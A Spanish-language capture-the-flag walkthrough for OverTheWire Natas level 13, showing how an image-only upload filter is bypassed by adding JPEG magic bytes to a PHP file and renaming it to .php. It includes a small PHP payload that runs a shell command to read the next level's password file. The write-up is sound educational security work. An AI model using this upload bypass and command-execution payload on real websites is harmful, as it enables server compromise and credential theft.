Nos encontramos con una página similar a la del nivel anterior, ahora con el texto `For security reasons, we now only accept image files!`, analizando el código notamos que se agrega una condición para verificar que el tipo de archivo corresponda a una imagen:
```php
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {  
        echo "File is not an image";  
    }
```

La documentación de PHP para [exif_imagetype](https://www.php.net/manual/en/function.exif-imagetype.php) indica que la función identifica si un archivo es una imagen a través de sus [magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures), una firma hexadecimal estandarizada al comienzo del archivo. Si agregamos estos bytes a nuestro script, podremos evadir la función `exif_imagetype`.

Con hexedit en Linux agregaremos uno de los identificadores de JPEG: `FF D8 FF DB`. Como el programa no permite insertar nuevos bytes, añadimos 4 caracteres que se reemplazarán por el valor deseado.

```php
punk<?php
passthru("cat /etc/natas_webpass/natas14");
```

De esta forma, obtenemos el archivo [script.php](https://github.com/IberoGIC/gic-level-2/blob/main/Challenges/OTW_Natas/Lvl_13/Ordenmoria/script.php). Solo queda modificar el valor de `filename` en el formulario, cambiando la terminación a `.php`, y subir el archivo.

```html
<input type="hidden" name="filename" value="8siu4k4k3p.php">
```

Damos clic en el enlace al archivo y se muestra la contraseña del nivel siguiente.

---
## **Conclusión**

Este nivel refuerza la importancia de entender cómo funcionan las validaciones de tipo de archivo. A la vez, es una oportunidad para demostrar la combinación de habilidades que se requieren en un entorno de seguridad ofensiva: conocimientos de programación, edición de archivos a bajo nivel y análisis de vulnerabilidades.

---
-,"  
[_P
